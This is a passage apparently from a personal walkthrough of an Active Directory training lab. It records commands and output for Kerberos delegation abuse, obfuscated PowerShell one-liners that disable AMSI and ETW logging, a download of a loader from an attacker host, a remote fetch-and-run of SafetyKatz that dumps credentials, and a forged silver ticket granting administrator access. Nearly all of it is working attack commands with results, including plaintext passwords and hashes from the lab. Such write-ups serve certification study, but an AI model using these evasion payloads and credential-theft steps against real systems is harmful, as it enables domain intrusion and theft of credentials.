[*] Impersonating user 'Administrator'🎭 to target SPN 'CIFS📌/mgmtsrv🖥️.tech.finance.corp'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'CIFS/mgmtsrv.tech.finance.corp'
[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[*] Sending S4U2proxy request to domain controller 172.16.4.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'http'📌
[*] base64(ticket.kirbi) for SPN 'http📌/mgmtsrv🖥️.tech.finance.corp':

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Cached Tickets: (1)

#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: http📌/mgmtsrv🖥️.tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 3/11/2025 9:10:04 (local)
        End Time:   3/11/2025 19:10:04 (local)
        Renew Time: 3/18/2025 9:10:04 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

- **Leverage the Obtained Ticket to Run a DCSync Attack on the DC and Gain DA Privileges**
???

`winrs -r:mgmtsrv.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECH>
```
🚀

![mgmtsrv | administrator](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👤
```

`set computername`:
```
COMPUTERNAME=MGMTSRV🖥️
```

### ???

![mgmtsrv | administrator](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator-64b5f6?logo=windows11&logoColor=white)

`powershell`

`$ExecutionContext.SessionState.LanguageMode`:
```
FullLanguage
```

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

``:
```

```

- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**
???

![HFS - Loader.exe](learning_objective_07_hfs_loader.png)

`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`

`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

![HFS -SafetyKatz.exe](learning_objective_07_hfs_safetykatz.png)

`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 93339 (00000000:00016c9b)
Session           : Service from 0
User Name         : techservice👤
Domain            : TECH
Logon Server      : TECH-DC
Logon Time        : 3/11/2025 6:54:59 AM
SID               : S-1-5-21-1325336202-3661212667-302732393-1109

         * Username : techservice
         * Domain   : TECH.FINANCE.CORP
         * Password : Agent for Server1!🔑
         * Key List :
           aes256_hmac       7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb🔑
           aes128_hmac       1e88fc138cbb482e14a836ab47e22816
           rc4_hmac_nt       ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_old      ac25af07540962863d18c6f924ee8ff3
           rc4_md4           ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_nt_exp   ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_old_exp  ac25af07540962863d18c6f924ee8ff3

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MGMTSRV$👤
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 5:54:34 AM
SID               : S-1-5-18

         * Username : mgmtsrv$
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       e88b558cf0e531fd9cff56c8db3b24ce6784e62e5b2f9cb807b5afa9dfed2fa7🔑
           rc4_hmac_nt       207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_old      207218a0920d00bbbd4daa22f6e767d3
           rc4_md4           207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_nt_exp   207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_old_exp  207218a0920d00bbbd4daa22f6e767d3

[SNIP]
```
🚩

#### Domain Persistence | Silver Ticket

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/mgmtsrv.tech.finance.corp /rc4:207218a0920d00bbbd4daa22f6e767d3 /sid:S-1-5-21-1325336202-3661212667-302732393 /ldap /user:administrator /domain:tech.finance.corp /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Domain         : TECH.FINANCE.CORP🏛️ (TECH)
[*] SID            : S-1-5-21-1325336202-3661212667-302732393
[*] UserId         : 1109
[*] Groups         : 513
[*] ServiceKey     : 207218A0920D00BBBD4DAA22F6E767D3
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 207218A0920D00BBBD4DAA22F6E767D3
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : http📌
[*] Target         : mgmtsrv🖥️.tech.finance.corp

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'administrator'🎭 to 'http/mgmtsrv.tech.finance.corp'

[*] AuthTime       : 3/11/2025 9:51:08 AM
[*] StartTime      : 3/11/2025 9:51:08 AM
[*] EndTime        : 3/11/2025 7:51:08 PM
[*] RenewTill      : 3/18/2025 9:51:08 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x13e557

Cached Tickets: (1)

#0>     Client: administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: http📌/mgmtsrv🖥️.tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 3/11/2025 9:51:08 (local)
        End Time:   3/11/2025 19:51:08 (local)
        Renew Time: 3/18/2025 9:51:08 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

`winrs -r:mgmtsrv.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECH>
```
🚀

#### Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)

- **Find a Target SQL Server where we have Connection Privileges**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`

`Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose`:
```
VERBOSE: dbserver31.tech.finance.corp : Connection Failed.
```
❌



---

